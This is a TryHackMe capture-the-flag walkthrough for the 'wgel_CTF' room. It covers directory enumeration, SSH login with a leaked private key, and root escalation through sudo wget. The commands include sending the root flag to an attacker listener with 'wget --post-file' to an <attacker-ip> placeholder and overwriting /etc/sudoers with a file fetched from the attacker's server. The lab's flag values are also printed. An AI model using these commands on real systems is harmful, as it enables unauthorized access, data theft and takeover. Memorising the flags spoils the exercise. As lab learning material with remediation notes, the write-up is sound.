# 🛡️ TryHackMe: wgel_CTF — Full Professional Walkthrough

**Room:** `wgel_CTF`  
**Difficulty:** Easy → Medium  
**Platform:** TryHackMe  
**Category:** Web Exploitation, Privilege Escalation  
**Author:** Savneet  
**Tools Used:** `dirsearch`, `wget`, `ssh`, `netcat`, `sudo`, `nano`

## 🧭 Initial Reconnaissance

Visiting `http://10.201.77.33` reveals the default Apache2 welcome page. With no login interface or linked directories, I reviewed the page source and uncovered a subtle hint:

```html
<!-- Jessie don't forget to udate the webiste -->
```

This comment provides:
- Username enumeration (`jessie`)
- Implication of outdated or forgotten content
- Suggestion that legacy or exposed paths may exist

## 📂 Directory Enumeration

To enumerate hidden paths, I used:

```bash
dirsearch -u http://10.201.77.33 --deep-recursive
```

### 🔍 Results

- `/sitemap/.ssh/`
- `/sitemap/.ssh/id_rsa`

A private SSH key was found in a publicly exposed directory—confirming a severe security misconfiguration.


## 🔑 SSH Access via Leaked RSA Key

Downloaded and secured the SSH key:

```bash
wget http://10.201.77.33/sitemap/.ssh/id_rsa
chmod 600 id_rsa
```

Authenticated as `jessie`:

```bash
ssh -i id_rsa jessie@10.201.77.33
```

Access successful—initial shell obtained.

## 🎯 User Flag

Navigated to Jessie’s Documents folder:

```bash
cat ~/Documents/user_flag.txt
```

<details>
`057c67131c3d5e42dd5cd3075b198ff6`
</details>

## 🔍 Privilege Escalation – Sudo Analysis

Enumerated Jessie’s sudo privileges:

```bash
sudo -l
```

**Output:**

```
User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

This reveals that Jessie can run `wget` as root without authentication, opening multiple escalation paths.

## 🛠 Method A — Exfiltrate Root Flag via Netcat

**Attacker Machine:**

```bash
nc -nvlp 8080
```

**Target Machine:**

```bash
sudo /usr/bin/wget --post-file=/root/root_flag.txt http://<attacker-ip>:8080
```

<details>
`b1b968b37519ad1daa6408188649263d`
</details>

## 🚀 Method B — Full Root Shell via Sudoers Injection

**Step 1:** Create custom sudoers file:

```text
jessie ALL=(ALL) NOPASSWD: ALL
```

**Step 2:** Host it:

```bash
python3 -m http.server 8080
```

**Step 3:** Overwrite on victim:

```bash
cd /etc
sudo /usr/bin/wget http://<attacker-ip>:8080/sudoers --output-document=sudoers
```

**Step 4:** Escalate:

```bash
sudo su
whoami
```

Root shell achieved.

<details>
`b1b968b37519ad1daa6408188649263d`
</details>


## 🧠 Key Takeaways & Remediation Strategies

| Finding                  | Severity | Root Cause                           | Mitigation                          |
|--------------------------|----------|--------------------------------------|-------------------------------------|
| Public SSH key exposure | Critical | Web directory misconfiguration       | Disable listing; scrub secrets      |
| Sudo access to `wget`   | High     | Over-permissive sudoers entry        | Limit binary escalation pathways    |
| Writable `/etc`         | Critical | Lack of ACL enforcement               | Harden system paths and permissions |


## 📌 Summary

This CTF demonstrated the impact of poor web server hygiene and excessive privileges:

- A single leaked SSH key can grant direct user access
- Misconfigured sudo rules can enable root privilege escalation
- Writable system paths amplify attacker control

By following best practices—like auditing exposed content and enforcing least-privilege—you can defend against these vectors in real-world environments.
